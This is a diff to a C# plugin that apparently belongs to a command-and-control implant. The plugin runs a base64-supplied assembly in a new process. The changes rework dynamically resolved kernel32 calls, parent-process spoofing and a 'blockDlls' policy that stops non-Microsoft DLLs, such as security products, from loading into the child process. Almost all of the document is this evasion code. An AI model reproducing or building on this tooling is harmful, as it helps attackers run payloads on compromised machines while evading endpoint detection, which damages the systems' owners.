@@ -14,9 +14,7 @@ namespace Plugins
     {
         DynamicHandler.DynamicMakePipe dlgCretPipe = (DynamicHandler.DynamicMakePipe)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CrtPipe, typeof(DynamicHandler.DynamicMakePipe));
         DynamicHandler.DynamicSetHndlInfo dlgSetHandle = (DynamicHandler.DynamicSetHndlInfo)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.SetHanldeInfo, typeof(DynamicHandler.DynamicSetHndlInfo));
-        //DynamicHandler.DynamicInitProcThreaAttrList dlgInitProcThreadAttrLst = (DynamicHandler.DynamicInitProcThreaAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrList, typeof(DynamicHandler.DynamicInitProcThreaAttrList));
-        //DynamicHandler.DynamicInitProcThreaAttrList2 dlgInitProcThreadAttrLst2 = (DynamicHandler.DynamicInitProcThreaAttrList2)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrList, typeof(DynamicHandler.DynamicInitProcThreaAttrList2));
-
+        DynamicHandler.DynamicInitProcThreaAttrList dlgInitProcThreadAttrLst = (DynamicHandler.DynamicInitProcThreaAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrlist, typeof(DynamicHandler.DynamicInitProcThreaAttrList));
         DynamicHandler.DynamicCreateProc dlgCretProc = (DynamicHandler.DynamicCreateProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CreateProc, typeof(DynamicHandler.DynamicCreateProc));
         DynamicHandler.DynamicWaitForSingleObject dlgWaitForObj = (DynamicHandler.DynamicWaitForSingleObject)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.WitFrObj, typeof(DynamicHandler.DynamicWaitForSingleObject));
         DynamicHandler.DynamicOpenProc dlgOpenProc = (DynamicHandler.DynamicOpenProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.OpenProc, typeof(DynamicHandler.DynamicOpenProc));
@@ -40,12 +38,9 @@ namespace Plugins
 
                 byte[] b = Misc.Base64DecodeToByteArray(args["asm"]);
 
-                if (!string.IsNullOrEmpty(args["parent"]))
+                if (!string.IsNullOrEmpty(args["parent"]) && int.TryParse(args["parent"], out parent))
                 {
-                    if (int.TryParse(args["parent"], out parent))
-                    {
-                        spoofParent = true;
-                    }
+                    spoofParent = true;
                 }
 
                 if (bool.Parse(args["blockDlls"]))
@@ -98,19 +93,18 @@ namespace Plugins
             siEx.StartupInfo.hStdError = hStdOutWrite;
             siEx.StartupInfo.hStdOutput = hStdOutWrite;
 
-            var lpSize = IntPtr.Zero;
-            var success = StaticHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
-            //var test = IntPtr.Zero;
-            //var success = dlgInitProcThreadAttrLst(IntPtr.Zero, 2, 0, ref lpSize);
+            var lpSize = new IntPtr();
 
+            //var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+            var success = dlgInitProcThreadAttrLst(IntPtr.Zero, 2, 0, ref lpSize);
             if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
             {
                 return false;
             }
 
             siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            success = StaticHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
-            //success = dlgInitProcThreadAttrLst(out siEx.lpAttributeList, 2, 0, ref lpSize);
+            success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
+
             if (!success)
             {
                 TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
@@ -240,6 +234,7 @@ namespace Plugins
 
             // Add Microsoft-only DLL protection to our StartupInfoEx struct
             var success = Native.UpdateProcThreadAttribute(
+            //var success = dlgUpdProcThreadAttr(
                 siEx.lpAttributeList,
                 0,
                 (IntPtr)DynamicHandler.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
@@ -250,6 +245,7 @@ namespace Plugins
 
             if (!success)
             {
+                Console.WriteLine("Not success.");
                 return false;
             }
             return true;
